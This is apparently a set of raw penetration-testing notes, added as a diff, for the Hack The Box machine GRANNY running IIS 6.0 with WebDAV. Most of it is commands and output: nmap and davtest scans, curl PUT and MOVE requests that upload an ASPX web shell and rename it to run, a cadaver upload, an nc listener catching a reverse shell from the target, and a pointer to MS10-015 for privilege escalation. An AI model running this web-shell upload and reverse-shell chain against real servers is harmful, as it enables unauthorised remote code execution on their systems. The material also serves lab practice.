@@ -1,0 +1,174 @@
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+| http-webdav-scan: 
+|   Server Type: Microsoft-IIS/6.0
+|   Server Date: Tue, 16 Sep 2025 02:07:46 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   WebDAV type: Unknown
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+┌──(ed㉿kali)-[~]
+└─$ davtest -url http://10.10.10.15
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+	LANGUAGE = (unset),
+	LC_ALL = (unset),
+	LC_CTYPE = (unset),
+	LC_NUMERIC = "zh_CN.UTF-8",
+	LC_COLLATE = (unset),
+	LC_TIME = "en_US.UTF-8",
+	LC_MESSAGES = (unset),
+	LC_MONETARY = "zh_CN.UTF-8",
+	LC_ADDRESS = "zh_CN.UTF-8",
+	LC_IDENTIFICATION = "zh_CN.UTF-8",
+	LC_MEASUREMENT = "zh_CN.UTF-8",
+	LC_PAPER = "zh_CN.UTF-8",
+	LC_TELEPHONE = "zh_CN.UTF-8",
+	LC_NAME = "zh_CN.UTF-8",
+	LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to a fallback locale ("en_US.UTF-8").
+********************************************************
+ Testing DAV connection
+OPEN		SUCCEED:		http://10.10.10.15
+********************************************************
+NOTE	Random string for this session: 7XEcB7NZFbbUs7
+********************************************************
+ Creating directory
+MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7
+********************************************************
+ Sending test files
+PUT	shtml	FAIL
+PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.txt
+PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.cfm
+PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.jsp
+PUT	aspx	FAIL
+PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.pl
+PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.jhtml
+PUT	cgi	FAIL
+PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.html
+PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.php
+PUT	asp	FAIL
+********************************************************
+ Checking for test file execution
+EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.txt
+EXEC	txt	FAIL
+EXEC	cfm	FAIL
+EXEC	jsp	FAIL
+EXEC	pl	FAIL
+EXEC	jhtml	FAIL
+EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_7XEcB7NZFbbUs7/davtest_7XEcB7NZFbbUs7.html
+EXEC	html	FAIL
+EXEC	php	FAIL
+
+─$ curl -X PUT http://10.10.10.15/n.txt -d @n.txt
+                                                                                                                  
+┌──(ed㉿kali)-[~/tools]
+└─$ curl -X PUT http://10.10.10.15/n.aspx -d @n.txt
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
+<STYLE type="text/css">
+  BODY { font: 8pt/12pt verdana }
+  H1 { font: 13pt/15pt verdana }
+  H2 { font: 8pt/12pt verdana }
+  A:link { color: red }
+  A:visited { color: maroon }
+</STYLE>
+</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>
+
+<h1>The page cannot be displayed</h1>
+You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
+<hr>
+<p>Please try the following:</p>
+<ul>
+<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
+</ul>
+<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
+<hr>
+<p>Technical Information (for support personnel)</p>
+<ul>
+<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
+<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
+ and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
+<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
+</ul>
+
+</TD></TR></TABLE></BODY></HTML>
+
+
+┌──(ed㉿kali)-[~/tools]
+└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
+                                                                                                                  
+┌──(ed㉿kali)-[~/tools]
+└─$ curl -X PUT http://10.10.10.15/cmd.txt -d @cmdasp.aspx                            
+                                                                                                                  
+┌──(ed㉿kali)-[~/tools]
+└─$ curl -X MOVE -H 'Destination:http://10.10.10.15/cmd.aspx' http://10.10.10.15/cmd.txt  
+
+
+http://10.10.10.15/cmd.aspx  //get a web shell
+
+Host Name:                 GRANNY
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            0 Days, 0 Hours, 52 Minutes, 53 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2995 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 737 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,285 MB
+Page File: In Use:         185 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+Network Card(s):           N/A
+
+
+
+root@kali# curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx 
+
+//cadaver is stable to put file
+└─$ cadaver http://10.10.10.15                      
+dav:/> put shell.aspx.txt
+Uploading shell.aspx.txt to `/shell.aspx.txt': Could not open file: No such file or directory
+dav:/> put shell.aspx.txt
+Uploading shell.aspx.txt to `/shell.aspx.txt':
+Progress: [=============================>] 100.0% of 15972 bytes succeeded.
+
+
+➜  Downloads nc -nvlp 8821
+Listening on 0.0.0.0 8821
+Connection received on 10.10.10.15 1042
+Spawn Shell...
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>
+
+//rely on secwiki, ms10-15
